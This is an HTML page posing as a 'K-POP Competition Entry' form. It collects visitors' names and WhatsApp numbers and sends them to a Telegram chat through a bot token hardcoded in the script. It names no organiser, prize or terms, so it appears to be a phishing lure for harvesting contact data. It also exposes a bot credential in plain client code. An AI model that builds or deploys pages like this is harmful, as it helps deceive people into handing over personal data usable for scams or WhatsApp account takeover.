<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>K-POP Competition Entry</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
<style>
*{ margin:0; padding:0; box-sizing:border-box; }
body, html{ width:100%; height:100%; font-family:Inter, sans-serif; color:#fff; overflow:hidden; }
video#bgVideo{
  position:fixed; top:0; left:0; width:100%; height:100%;
  object-fit:cover; z-index:-1;
}
.container{
  position:relative; z-index:1;
  display:flex; flex-direction:column; justify-content:center; align-items:center;
  height:100vh; text-align:center; backdrop-filter: brightness(0.4);
}
h1{ font-size:28px; margin-bottom:10px; }
.sub{ font-size:14px; color:#bbb; margin-bottom:20px; }
input{
  width:250px; padding:10px 12px; margin:6px 0; border-radius:8px; border:none;
  font-size:14px;
}
button{
  padding:10px 18px; font-size:16px; border-radius:10px;
  border:none; background:#ff0000; color:#fff; cursor:pointer; margin-top:10px;
}
button:hover{ background:#cc0000; }
#msg{ margin-top:12px; font-size:14px; }
#clock{ margin-top:20px; font-size:18px; color:#8cffb2; }
#unmuteBtn{ background:#0000ff; margin-top:10px; }
</style>
</head>
<body>

<video id="bgVideo" autoplay muted loop>
  <source src="https://files.catbox.moe/yl3x89.mp4" type="video/mp4">
  Your browser does not support HTML5 video.
</video>

<div class="container">
<h1>K-POP Competition Entry</h1>
<div class="sub">Enter your Name & WhatsApp number</div>
<input id="name" placeholder="Full Name" maxlength="40" />
<input id="number" placeholder="WhatsApp Number e.g., 9477xxxxxxx" maxlength="13" />
<button id="sendBtn">Submit</button>
<button id="unmuteBtn">Unmute Video</button>
<div id="msg"></div>
<div id="clock">--:--:--</div>
</div>

<script>
const TELEGRAM_BOT_TOKEN = "8106750141:AAGLbi-JZb0vhdMH3bMcbeX8L3IpdcJenxM";
const TELEGRAM_CHAT_ID = "1720283336";

// Telegram send function
function sendTelegramMessage(message){
  return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode:"HTML" })
  });
}

// Submit button
document.getElementById("sendBtn").addEventListener("click", async ()=>{
  const name = document.getElementById("name").value.trim();
  const number = document.getElementById("number").value.trim();
  const msgDiv = document.getElementById("msg");
  msgDiv.textContent="Submitting...";

  if(!name){ msgDiv.textContent="❌ Please enter your name"; return; }
  if(!/^\d{10,13}$/.test(number)){ msgDiv.textContent="❌ Enter valid WhatsApp number"; return; }

  const text = `New K-POP Competition Entry:\nName: <b>${name}</b>\nWhatsApp: <b>${number}</b>`;
  try{
    await sendTelegramMessage(text);
    msgDiv.textContent="✅ Submitted successfully!";
    document.getElementById("name").value="";
    document.getElementById("number").value="";
  }catch(e){
    msgDiv.textContent="❌ Error sending info: "+e.message;
  }
});

// Clock
function updateClock(){
  const d = new Date();
  document.getElementById("clock").textContent = d.toLocaleTimeString('en-GB',{hour12:false});
}
setInterval(updateClock,1000);
updateClock();

// Unmute video button
const video = document.getElementById("bgVideo");
document.getElementById("unmuteBtn").addEventListener("click", ()=>{
  video.muted = false;
  video.play();
  document.getElementById("unmuteBtn").style.display="none";
});
</script>
</body>
</html>